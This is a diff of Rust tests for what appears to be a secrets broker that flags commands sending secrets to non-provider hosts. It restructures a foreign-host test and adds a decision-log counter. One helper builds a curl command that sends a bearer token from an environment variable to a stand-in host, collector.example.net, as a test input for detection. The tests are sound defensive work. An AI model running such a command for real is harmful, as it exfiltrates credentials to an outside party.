@@ -92,7 +92,8 @@ fn fixture(provider: Option<&str>) -> Fixture {
         .expect("owner-confirmed classification");
     let shared: SharedVault = Arc::new(Mutex::new(Some(vault)));
     let mut options = BrokerOptions::with_tls(TlsClient::platform().expect("TLS"));
-    options.approval_timeout = Duration::from_millis(300);
+    // Each refused run waits this long for the owner.
+    options.approval_timeout = Duration::from_millis(100);
     options.run_timeout = Duration::from_secs(10);
     options.bouncer = Some(
         BouncerClient::new(&bouncer.url)
@@ -141,6 +142,17 @@ fn last_flags(fx: &Fixture) -> Vec<String> {
     log.last().expect("an entry").entry.rule_flags.clone()
 }
 
+/// The number of decision log entries.
+fn log_len(fx: &Fixture) -> usize {
+    let guard = fx.vault.lock().expect("vault mutex");
+    guard
+        .as_ref()
+        .expect("open vault")
+        .decision_log()
+        .expect("log")
+        .len()
+}
+
 fn read_to(host: &str) -> String {
     format!("true || curl -s -H \"Authorization: Bearer ${ENV_NAME}\" https://{host}/v3/scopes")
 }
@@ -165,11 +177,26 @@ fn a_provider_host_is_allowed() {
         Some("approval_timeout")
     );
     assert_eq!(last_flags(&plain), vec!["secret_output".to_owned()]);
-}
 
-#[test]
-fn a_foreign_host_with_a_secret_is_flagged() {
-    let fx = fixture(Some("sendgrid"));
+    // A foreign host with a secret is flagged: the item of the first fixture with
+    // SendGrid as its provider (still owner-confirmed development/low).
+    {
+        let mut guard = fx.vault.lock().expect("vault mutex");
+        let vault = guard.as_mut().expect("open vault");
+        let declaration = Declaration {
+            project: "project".to_owned(),
+            environment: Environment::Development,
+            risk: RiskLevel::Low,
+            scope: Scope::ReadWrite,
+            reversibility: Reversibility::Reversible,
+        };
+        vault
+            .save_declaration(fx.item_id, &declaration, Some("sendgrid"), None)
+            .expect("declaration");
+        vault
+            .set_declaration_sources(fx.item_id, &DeclarationSources::default())
+            .expect("owner-confirmed classification");
+    }
     let response = run(&fx, &read_to("collector.example.net"));
     assert_eq!(
         response.error.as_ref().map(|e| e.code.as_str()),
@@ -187,8 +214,15 @@ fn a_foreign_host_with_a_secret_is_flagged() {
         "{:?}",
         last_flags(&fx)
     );
-    let plain = fixture(None);
+    // Without a provider there are no provider hosts, so no foreign_host flag. The run
+    // writes its own entry, so the check below cannot read an earlier one.
+    let before = log_len(&plain);
     let _ = run(&plain, &clone);
+    assert_eq!(
+        log_len(&plain),
+        before + 1,
+        "the clone run writes a decision entry"
+    );
     assert!(!last_flags(&plain).contains(&FOREIGN_HOST_FLAG.to_owned()));
 }
 
